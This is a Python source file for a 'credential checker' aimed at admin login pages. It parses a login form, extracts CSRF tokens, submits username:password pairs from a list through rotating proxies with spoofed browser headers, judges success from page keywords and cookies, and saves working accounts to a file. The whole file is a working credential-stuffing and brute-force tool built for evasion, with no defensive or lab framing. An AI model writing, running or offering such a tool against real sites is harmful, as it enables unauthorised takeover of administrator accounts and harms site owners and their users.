#!/usr/bin/env python3
"""
Advanced Credential Checker for Admin Login Pages
Supports CSRF tokens, session handling, proxy rotation, and stealth features
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import time
import json
import re
from typing import List, Dict, Optional, Tuple
from bs4 import BeautifulSoup
import random
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class CredentialChecker:
    def __init__(self, login_url: str, proxies: Optional[List[str]] = None, delay: float = 1.0):
        """
        Initialize the credential checker
        
        Args:
            login_url: URL of the login page
            proxies: List of proxy URLs (optional)
            delay: Delay between requests in seconds
        """
        self.login_url = login_url
        self.proxies = proxies or []
        self.delay = delay
        self.session = requests.Session()
        self.csrf_token = None
        self.session_cookie = None
        
        # Setup retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Set realistic headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
    
    def get_proxy(self) -> Optional[Dict[str, str]]:
        """Get a random proxy from the list"""
        if not self.proxies:
            return None
        
        proxy_url = random.choice(self.proxies)
        return {
            'http': proxy_url,
            'https': proxy_url
        }
    
    def analyze_login_page(self) -> Dict[str, any]:
        """
        Analyze the login page to extract form structure, CSRF tokens, etc.
        
        Returns:
            Dictionary with form details
        """
        try:
            logger.info(f"Analyzing login page: {self.login_url}")
            response = self.session.get(self.login_url, timeout=10, proxies=self.get_proxy())
            response.raise_for_status()
            
            # Save session cookie
            if response.cookies:
                self.session_cookie = response.cookies.get_dict()
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find login form
            form = soup.find('form')
            if not form:
                # Try to find form by common patterns
                form = soup.find('div', {'class': re.compile(r'login|form', re.I)})
            
            form_data = {
                'action': form.get('action', '') if form else '',
                'method': form.get('method', 'post').lower() if form else 'post',
                'fields': {},
                'csrf_token': None,
                'csrf_token_name': None,
            }
            
            # Extract form fields
            if form:
                inputs = form.find_all(['input', 'select', 'textarea'])
                for inp in inputs:
                    name = inp.get('name', '')
                    inp_type = inp.get('type', 'text').lower()
                    value = inp.get('value', '')
                    
                    if name:
                        form_data['fields'][name] = {
                            'type': inp_type,
                            'value': value,
                            'required': inp.has_attr('required')
                        }
            
            # Look for CSRF tokens
            csrf_patterns = [
                r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)',
                r'name=["\']csrf[_-]?token["\'].*?value=["\']([^"\']+)',
                r'<input[^>]*name=["\']([^"\']*csrf[^"\']*)["\'][^>]*value=["\']([^"\']+)',
            ]
            
            page_text = response.text
            for pattern in csrf_patterns:
                match = re.search(pattern, page_text, re.IGNORECASE)
                if match:
                    if len(match.groups()) == 2:
                        form_data['csrf_token_name'] = match.group(1)
                        form_data['csrf_token'] = match.group(2)
                    else:
                        form_data['csrf_token'] = match.group(1)
                    break
            
            # Also check hidden inputs for CSRF
            if form:
                hidden_inputs = form.find_all('input', {'type': 'hidden'})
                for inp in hidden_inputs:
                    name = inp.get('name', '').lower()
                    if 'csrf' in name or 'token' in name:
                        form_data['csrf_token_name'] = inp.get('name')
                        form_data['csrf_token'] = inp.get('value', '')
                        break
            
            # Determine login field names (common patterns)
            username_fields = ['username', 'user', 'email', 'login', 'account', 'userid', 'user_id']
            password_fields = ['password', 'pass', 'pwd', 'passwd']
            
            form_data['username_field'] = None
            form_data['password_field'] = None
            
            for field_name in form_data['fields'].keys():
                field_lower = field_name.lower()
                if not form_data['username_field'] and any(u in field_lower for u in username_fields):
                    form_data['username_field'] = field_name
                if not form_data['password_field'] and any(p in field_lower for p in password_fields):
                    form_data['password_field'] = field_name
            
            logger.info(f"Form analysis complete: {form_data}")
            return form_data
            
        except Exception as e:
            logger.error(f"Error analyzing login page: {e}")
            return {}
    
    def check_credentials(self, username: str, password: str, form_data: Optional[Dict] = None) -> Tuple[bool, Dict]:
        """
        Check if credentials are valid
        
        Args:
            username: Username to check
            password: Password to check
            form_data: Form structure (if None, will analyze first)
        
        Returns:
            Tuple of (is_valid, response_info)
        """
        if form_data is None:
            form_data = self.analyze_login_page()
        
        if not form_data:
            logger.error("Could not analyze login page")
            return False, {'error': 'Failed to analyze login page'}
        
        try:
            # Prepare login data
            login_data = {}
            
            # Add username
            username_field = form_data.get('username_field') or 'username'
            login_data[username_field] = username
            
            # Add password
            password_field = form_data.get('password_field') or 'password'
            login_data[password_field] = password
            
            # Add CSRF token if found
            if form_data.get('csrf_token') and form_data.get('csrf_token_name'):
                login_data[form_data['csrf_token_name']] = form_data['csrf_token']
            elif form_data.get('csrf_token'):
                # Try common CSRF token names
                login_data['csrf_token'] = form_data['csrf_token']
                login_data['token'] = form_data['csrf_token']
            
            # Add any other required fields
            for field_name, field_info in form_data.get('fields', {}).items():
                if field_info.get('required') and field_name not in login_data:
                    login_data[field_name] = field_info.get('value', '')
            
            # Determine form action URL
            form_action = form_data.get('action', '')
            if form_action:
                if form_action.startswith('http'):
                    submit_url = form_action
                elif form_action.startswith('/'):
                    from urllib.parse import urljoin
                    submit_url = urljoin(self.login_url, form_action)
                else:
                    from urllib.parse import urljoin
                    submit_url = urljoin(self.login_url, form_action)
            else:
                submit_url = self.login_url
            
            # Submit login
            method = form_data.get('method', 'post').upper()
            logger.info(f"Attempting login: {username} @ {submit_url}")
            
            if method == 'POST':
                response = self.session.post(
                    submit_url,
                    data=login_data,
                    allow_redirects=True,
                    timeout=10,
                    proxies=self.get_proxy()
                )
            else:
                response = self.session.get(
                    submit_url,
                    params=login_data,
                    allow_redirects=True,
                    timeout=10,
                    proxies=self.get_proxy()
                )
            
            # Analyze response to determine if login was successful
            response_info = {
                'status_code': response.status_code,
                'url': response.url,
                'content_length': len(response.content),
                'headers': dict(response.headers),
                'cookies': dict(response.cookies),
            }
            
            # Check for success indicators
            success_indicators = [
                'dashboard', 'welcome', 'logout', 'profile', 'admin',
                'success', 'logged in', 'home', 'main'
            ]
            
            failure_indicators = [
                'invalid', 'incorrect', 'wrong', 'error', 'failed',
                'login', 'try again', 'access denied'
            ]
            
            response_text_lower = response.text.lower()
            
            # Check redirect (often indicates success)
            if response.url != submit_url and 'login' not in response.url.lower():
                response_info['redirected'] = True
                response_info['redirect_url'] = response.url
            
            # Check for success/failure keywords
            success_count = sum(1 for indicator in success_indicators if indicator in response_text_lower)
            failure_count = sum(1 for indicator in failure_indicators if indicator in response_text_lower)
            
            # Check for session cookies (often indicates success)
            has_session_cookie = any('session' in k.lower() or 'auth' in k.lower() for k in response.cookies.keys())
            
            # Determine validity
            is_valid = False
            
            if response.status_code == 200:
                if has_session_cookie and success_count > failure_count:
                    is_valid = True
                elif response_info.get('redirected') and 'login' not in response.url.lower():
                    is_valid = True
                elif success_count >= 2:
                    is_valid = True
                elif failure_count == 0 and has_session_cookie:
                    is_valid = True
            
            response_info['is_valid'] = is_valid
            response_info['success_indicators'] = success_count
            response_info['failure_indicators'] = failure_count
            response_info['has_session_cookie'] = has_session_cookie
            
            # Add delay to avoid rate limiting
            time.sleep(self.delay)
            
            return is_valid, response_info
            
        except Exception as e:
            logger.error(f"Error checking credentials: {e}")
            return False, {'error': str(e)}
    
    def check_credential_list(self, credentials: List[Tuple[str, str]], output_file: Optional[str] = None) -> Dict:
        """
        Check a list of credentials
        
        Args:
            credentials: List of (username, password) tuples
            output_file: Optional file to save valid credentials
        
        Returns:
            Dictionary with results
        """
        logger.info(f"Starting credential check for {len(credentials)} accounts")
        
        # Analyze login page once
        form_data = self.analyze_login_page()
        
        results = {
            'valid': [],
            'invalid': [],
            'errors': [],
            'total': len(credentials),
            'checked': 0
        }
        
        for username, password in credentials:
            try:
                is_valid, response_info = self.check_credentials(username, password, form_data)
                results['checked'] += 1
                
                if is_valid:
                    valid_account = {
                        'username': username,
                        'password': password,
                        'response_info': response_info
                    }
                    results['valid'].append(valid_account)
                    logger.info(f"✅ VALID: {username}:{password}")
                    
                    # Save to file immediately
                    if output_file:
                        with open(output_file, 'a') as f:
                            f.write(f"{username}:{password}\n")
                else:
                    results['invalid'].append({'username': username, 'password': password})
                    logger.debug(f"❌ Invalid: {username}")
                    
            except Exception as e:
                logger.error(f"Error checking {username}: {e}")
                results['errors'].append({'username': username, 'error': str(e)})
        
        logger.info(f"Check complete: {len(results['valid'])} valid, {len(results['invalid'])} invalid")
        return results


def main():
    """Example usage"""
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python credential_checker.py <login_url> <username> <password> [proxy1] [proxy2] ...")
        print("Or: python credential_checker.py <login_url> <credentials_file> [proxy1] [proxy2] ...")
        sys.exit(1)
    
    login_url = sys.argv[1]
    proxies = sys.argv[3:] if len(sys.argv) > 3 else []
    
    checker = CredentialChecker(login_url, proxies=proxies if proxies else None)
    
    # Check if second arg is a file or single credential
    if '@' in sys.argv[2] or ':' in sys.argv[2]:
        # Single credential format: username:password or username@password
        if ':' in sys.argv[2]:
            username, password = sys.argv[2].split(':', 1)
        else:
            username, password = sys.argv[2].split('@', 1)
        
        is_valid, info = checker.check_credentials(username, password)
        if is_valid:
            print(f"✅ VALID: {username}:{password}")
            print(f"Response: {info}")
        else:
            print(f"❌ INVALID: {username}:{password}")
    else:
        # File with credentials (one per line: username:password)
        credentials_file = sys.argv[2]
        credentials = []
        
        try:
            with open(credentials_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        username, password = line.split(':', 1)
                        credentials.append((username, password))
        except FileNotFoundError:
            print(f"Error: File {credentials_file} not found")
            sys.exit(1)
        
        output_file = f"valid_accounts_{int(time.time())}.txt"
        results = checker.check_credential_list(credentials, output_file=output_file)
        
        print(f"\n{'='*50}")
        print(f"Results: {len(results['valid'])} valid out of {results['total']} checked")
        print(f"Valid accounts saved to: {output_file}")
        print(f"{'='*50}")


if __name__ == '__main__':
    main()
